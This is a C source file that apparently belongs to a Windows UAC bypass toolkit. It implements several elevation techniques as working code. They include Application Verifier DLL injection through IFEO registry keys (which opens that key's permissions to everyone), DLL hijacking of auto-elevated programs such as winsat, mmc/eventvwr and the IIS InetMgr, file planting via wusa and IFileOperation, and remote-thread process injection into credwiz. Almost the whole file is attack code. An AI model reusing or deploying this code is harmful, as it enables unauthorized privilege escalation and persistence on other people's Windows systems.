/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2016
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     2.01
*
*  DATE:        04 Jan 2016
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"

#include <Shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

ELOAD_PARAMETERS_4 g_ElevParamsSirefef;

/*
* ucmAvrfMethod
*
* Purpose:
*
* Acquire elevation through Application Verifier dll injection.
*
*/
BOOL ucmAvrfMethod(
	CONST PVOID AvrfDll,
	DWORD AvrfDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	HKEY hKey = NULL, hSubKey = NULL;
	LRESULT lRet;
	DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
	WCHAR szCmd[MAX_PATH * 4];

	if (
		(AvrfDll == NULL) ||
		(AvrfDllSize == 0)
		)
	{
		return bResult;
	}

	do {

		//
		// Set new key security dacl
		// Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
		//
		if (!ucmSimdaAlterObjectSecurity(SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, T_IFEO, T_SDDL_ALL_FOR_EVERYONE))
			break;

		//open IFEO key
		lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
			0, KEY_ALL_ACCESS, &hKey);
		if ((lRet != ERROR_SUCCESS) || (hKey == NULL))
			break;

		//Set new key and values
		hSubKey = NULL;
		lRet = RegCreateKey(hKey, TEXT("cliconfg.exe"), &hSubKey);
		if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
			break;

		lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
		if (lRet != ERROR_SUCCESS)
			break;

		dwValue = (DWORD)_strlen(T_AVRFDLL) * sizeof(TCHAR);
		lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&T_AVRFDLL, dwValue);
		if (lRet != ERROR_SUCCESS)
			break;

		// Cleanup registry, we don't need anymore.
		RegCloseKey(hSubKey);
		hSubKey = NULL;
		RegCloseKey(hKey);
		hKey = NULL;

		//
		// Extract file to the protected directory
		// First, create cab with fake msu ext, second run fusion process.
		//
		if (!ucmCreateCabinetForSingleFile(T_AVRF_SOURCEDLL, AvrfDll, AvrfDllSize))
			break;

		// Drop Hibiki to system32
		if (!ucmWusaExtractPackage(T_AVRF_CMDLINE))
			break;

		// Finally run target fusion process.
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(METHOD_SQLSRV_TARGETAPP,
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}
	if (hSubKey != NULL) {
		RegCloseKey(hSubKey);
	}
	return bResult;
}

/*
* ucmWinSATMethod
*
* Purpose:
*
* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer/IFileOperation autoelevation.
* Slightly modified target and proxydll can work almost with every autoelevated/whitelisted application.
* This method uses advantage of wusa to write to the protected folders, but can be adapted to IFileOperation too.
* WinSAT used for demonstration purposes only.
*
*/
BOOL ucmWinSATMethod(
	LPWSTR lpTargetDll,
	PVOID ProxyDll,
	DWORD ProxyDllSize,
	BOOL UseWusa
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	CABDATA *Cabinet = NULL;
	WCHAR szSource[MAX_PATH + 1];
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szBuffer[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0) ||
		(lpTargetDll == NULL) 
		)
	{
		return bResult;
	}

	if (_strlen_w(lpTargetDll) > 100) {
		return bResult;
	}

	RtlSecureZeroMemory(szSource, sizeof(szSource));
	RtlSecureZeroMemory(szDest, sizeof(szDest));

	do {

		if (ExpandEnvironmentStrings(L"%systemroot%\\system32\\winsat.exe",
			szSource, MAX_PATH) == 0)
		{
			break;
		}

		if (ExpandEnvironmentStrings(L"%temp%\\winsat.exe",
			szDest, MAX_PATH) == 0)
		{
			break;
		}

		// Copy winsat to temp directory
		if (!CopyFile(szSource, szDest, FALSE)) {
			break;
		}

		//put target dll
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, TEMPDIR);
		_strcat_w(szBuffer, lpTargetDll);


		//expand string for proxy dll
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
			break;
		}

		//write proxy dll to disk
		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
			break;
		}

		//
		// Two options: use wusa installer or IFileOperation
		//
		if ( UseWusa ) {

			//build cabinet
			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStringsW(T_MSUPACKAGE_NAME,
				szBuffer, MAX_PATH) == 0)
			{
				break;
			}

			Cabinet = cabCreate(szBuffer);
			if (Cabinet) {

				//expand string for winsat.exe
				if (ExpandEnvironmentStrings(L"%temp%\\winsat.exe",
					szDest, MAX_PATH) == 0)
				{
					break;
				}

				//put proxy dll inside cabinet
				cabAddFile(Cabinet, szSource, lpTargetDll);

				//put winsat.exe
				cabAddFile(Cabinet, szDest, L"winsat.exe");
				cabClose(Cabinet);
				Cabinet = NULL;
			}
			else {
				break;
			}

			//extract package
			ucmWusaExtractPackage(T_WINSAT_CMDLINE);

			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStrings(T_WINSAT_TARGET, szBuffer, MAX_PATH) == 0)	{
				break;
			}
			bResult = supRunProcess(szBuffer, NULL);
		}
		else {

			//wusa extract banned, switch to IFileOperation.
			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStringsW(M1W7_TARGETDIR, 
				szBuffer, MAX_PATH) == 0)
			{
				break;
			}
			bResult = ucmAutoElevateCopyFile(szSource, szBuffer);
			if (!bResult) {
				break;
			}
			bResult = ucmAutoElevateCopyFile(szDest, szBuffer);
			if (!bResult) {
				break;
			}
			
			Sleep(0);

			//run winsat
			RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
			if (ExpandEnvironmentStrings(T_WINSAT_TARGET, szBuffer, MAX_PATH) == 0)	{
				break;
			}
			bResult = supRunProcess(szBuffer, NULL);
			//cleanup of the above files must be done by payload code
		}

	} while (cond);

	if (Cabinet) {
		cabClose(Cabinet);
	}
	//remove trash from %temp%
	if (szDest[0] != 0) {
		DeleteFileW(szDest);
	}
	if (szSource[0] != 0) {
		DeleteFileW(szSource);
	}

	return bResult;
}

/*
* ucmMMCMethod
*
* Purpose:
*
* Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmMMCMethod(
	LPWSTR lpTargetDll,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szSource[MAX_PATH + 1];
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szBuffer[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0) ||
		(lpTargetDll == NULL)
		)
	{
		return bResult;
	}

	if (_strlen_w(lpTargetDll) > 100) {
		return bResult;
	}

	do {

		//put target dll
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, TEMPDIR);
		_strcat_w(szBuffer, lpTargetDll);

		//expand string for proxy dll
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
			break;
		}

		//write proxy dll to disk
		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
			break;
		}

		//expand string for target dir
		RtlSecureZeroMemory(szDest, sizeof(szDest));
		if (ExpandEnvironmentStringsW(SYSTEMROOTDIR,
			szDest, MAX_PATH) == 0)
		{
			break;
		}

		//drop fubuki to system32
		bResult = ucmAutoElevateCopyFile(szSource, szDest);
		if (!bResult) {
			break;
		}

		//run mmc console
		//because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command
		//event viewer will attempt to load not existing dll, so we will give him our little friend
		bResult = supRunProcess(L"mmc.exe", L"eventvwr.msc");

	} while (cond);

	return bResult;
}

DWORD WINAPI ucmElevatedLaunchProc(
	PELOAD_PARAMETERS_4 elvpar
	)
{
	BOOL				cond = FALSE;
	SHELLEXECUTEINFOW   shexec;

	if (elvpar == NULL)
		return (DWORD)E_FAIL;

	do {

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;
		shexec.lpVerb = elvpar->szVerb;
		shexec.lpFile = elvpar->szTargetApp;
		shexec.lpParameters = NULL;
		shexec.lpDirectory = NULL;
		if (elvpar->xShellExecuteExW(&shexec))
			if (shexec.hProcess != NULL) {
				elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
				elvpar->xCloseHandle(shexec.hProcess);
			}

	} while (cond);

	return S_OK;
}

/*
* ucmSirefefMethod
*
* Purpose:
*
* Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmSirefefMethod(
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL                    cond = FALSE, bResult = FALSE;
	DWORD                   c;
	HANDLE                  hProcess = NULL, hRemoteThread = NULL;
	HINSTANCE               selfmodule = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER       pdosh = (PIMAGE_DOS_HEADER)selfmodule;
	PIMAGE_FILE_HEADER      fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER  opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
	LPVOID                  remotebuffer = NULL, newEp, newDp;
	SIZE_T                  NumberOfBytesWritten = 0;
	PELOAD_PARAMETERS_4     elvpar = &g_ElevParamsSirefef;
	LPVOID                  elevproc = ucmElevatedLaunchProc;

	WCHAR szBuffer[MAX_PATH * 2];
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szSource[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0)
		)
	{
		return bResult;
	}

	do {
		//put Fubuki dll as netutils to %temp%
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, TEMPDIR);
		_strcat_w(szBuffer, L"netutils.dll");
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
			break;
		}
		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
			break;
		}

		//copy dll to wbem target folder
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		if (ExpandEnvironmentStringsW(WBEMDIR,
			szBuffer, MAX_PATH) == 0)
		{
			break;
		}
		//note: uacmAutoElevateCopyFile uses injection to explorer.exe
		bResult = ucmAutoElevateCopyFile(szSource, szBuffer);
		if (!bResult) {
			break;
		}

		//copy 1st stage target process
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(L"%systemroot%\\system32\\credwiz.exe",
			szSource, MAX_PATH) == 0)
		{
			break;
		}

		RtlSecureZeroMemory(szDest, sizeof(szDest));
		if (ExpandEnvironmentStrings(L"%temp%\\oobe.exe",
			szDest, MAX_PATH) == 0)
		{
			break;
		}
		if (!CopyFile(szSource, szDest, FALSE)) {
			break;
		}
		bResult = ucmAutoElevateCopyFile(szDest, szBuffer);
		if (!bResult) {
			break;
		}

		//setup basic shellcode routines
		RtlSecureZeroMemory(&g_ElevParamsSirefef, sizeof(g_ElevParamsSirefef));
		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ctx.hKernel32, "WaitForSingleObject");
		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ctx.hKernel32, "CloseHandle");

		//set shellcode 2nd stage target process
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(elvpar->szTargetApp, g_ctx.szSystemDirectory); //c:\windows\system32\wbem\oobe.exe
		_strcat_w(elvpar->szTargetApp, L"\\wbem\\oobe.exe");
		_strcpy_w(elvpar->szVerb, L"runas");
		_strcpy_w(szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
		_strcat_w(szBuffer, L"\\credwiz.exe");

		//run 1st stage target process
		hProcess = supRunProcessEx(szBuffer, NULL, NULL);
		if (hProcess == NULL) {
			break;
		}

		remotebuffer = VirtualAllocEx(hProcess, NULL, (SIZE_T)opth->SizeOfImage,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (remotebuffer == NULL) {
			break;
		}
		if (!WriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &NumberOfBytesWritten)) {
			break;
		}

		newEp = (char *)remotebuffer + ((char *)elevproc - (char *)selfmodule);
		newDp = (char *)remotebuffer + ((char *)elvpar - (char *)selfmodule);

		hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
		bResult = (hRemoteThread != NULL);
		if (bResult) {
			WaitForSingleObject(hRemoteThread, INFINITE);
			CloseHandle(hRemoteThread);
		}

	} while (cond);

	if (hProcess != NULL) {
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	return bResult;
}

/*
* ucmGenericAutoelevation
*
* Purpose:
*
* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
*
*/
BOOL ucmGenericAutoelevation(
	LPWSTR lpTargetApp,
	LPWSTR lpTargetDll,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szSource[MAX_PATH + 1];
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szBuffer[MAX_PATH + 1];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0) ||
		(lpTargetApp == NULL) ||
		(lpTargetDll == NULL)
		)
	{
		return bResult;
	}

	if (_strlen_w(lpTargetDll) > 100) {
		return bResult;
	}

	do {

		//put target dll
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, TEMPDIR);
		_strcat_w(szBuffer, lpTargetDll);

		//expand string for proxy dll
		RtlSecureZeroMemory(szSource, sizeof(szSource));
		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
			break;
		}

		//write proxy dll to disk
		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
			break;
		}

		//expand string for target dir
		RtlSecureZeroMemory(szDest, sizeof(szDest));
		if (ExpandEnvironmentStringsW(SYSTEMROOTDIR,
			szDest, MAX_PATH) == 0)
		{
			break;
		}

		//drop fubuki to system32
		bResult = ucmAutoElevateCopyFile(szSource, szDest);
		if (!bResult) {
			break;
		}

		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		if (ExpandEnvironmentStringsW(lpTargetApp,
			szBuffer, MAX_PATH) == 0)
		{
			break;
		}

		//run target app
		bResult = supRunProcess(szBuffer, NULL);

	} while (cond);

	return bResult;
}

/*
* ucmGWX
*
* Purpose:
*
* Bypass UAC by abusing newly added appinfo.dll backdoor.
* IIS initially not installed in Windows client, but appinfo.dll whitelists IIS application as autoelevated.
* We will use backdoor from "Get Windows 10" bullshit marketing promo package and exploit it with dll hijacking as usual.
*
*/
BOOL ucmGWX(
	VOID
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szDest[MAX_PATH + 1];
	WCHAR szTargetApp[MAX_PATH + 20];
	WCHAR szBuffer[MAX_PATH * 2];
	WCHAR szTempPath[MAX_PATH + 1];

	PVOID Data = NULL;
	ULONG DecompressedBufferSize = 0;

	do {

		//expand string for target dir
		RtlSecureZeroMemory(szDest, sizeof(szDest));
		if (ExpandEnvironmentStringsW(T_IIS_TARGETDIR,
			szDest, MAX_PATH) == 0)
		{
			break;
		}

		_strcpy_w(szTargetApp, szDest);
		_strcat_w(szTargetApp, TEXT("\\"));
		_strcat_w(szTargetApp, T_IIS_TARGETAPP);
		if (PathFileExistsW(szTargetApp)) {
			//File already exist, could be IIS installed
			OutputDebugString(TEXT("[UCM] IIS installed, abort"));
			break;
		}

		//summon some unicorns
		Data = DecompressPayload((CONST PVOID)KONGOUDLL, sizeof(KONGOUDLL), &DecompressedBufferSize);
		if (Data == NULL)
			break;
			
		//temp
		RtlSecureZeroMemory(szTempPath, sizeof(szTempPath));
		if (ExpandEnvironmentStrings(TEMPDIR, szTempPath, MAX_PATH) == 0) {
			break;
		}

		//put target dll
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, szTempPath);
		_strcat_w(szBuffer, T_IIS_TARGETDLL);

		//write proxy dll to disk
		if (!supWriteBufferToFile(szBuffer, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
			break;
		}

		//drop fubuki to system32\inetsrv
		bResult = ucmAutoElevateCopyFile(szBuffer, szDest);
		if (!bResult) {
			break;
		}
		DeleteFile(szBuffer);

		//put target app
		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
		_strcpy_w(szBuffer, szTempPath);
		_strcat_w(szBuffer, T_IIS_TARGETAPP);

		//write app to disk
		if (!supWriteBufferToFile(szBuffer, Data, DecompressedBufferSize)) {
			break;
		}
		
		//drop InetMgr.exe to system32\inetsrv
		bResult = ucmAutoElevateCopyFile(szBuffer, szDest);
		if (!bResult) {
			break;
		}
		DeleteFile(szBuffer);

		bResult = supRunProcess(szTargetApp, NULL);
		if (bResult) {
			OutputDebugString(TEXT("Whoever created this gwx shit must be fired"));
		}

	} while (cond);

	if (Data != NULL) {
		VirtualFree(Data, 0, MEM_RELEASE);
	}
	return bResult;
}
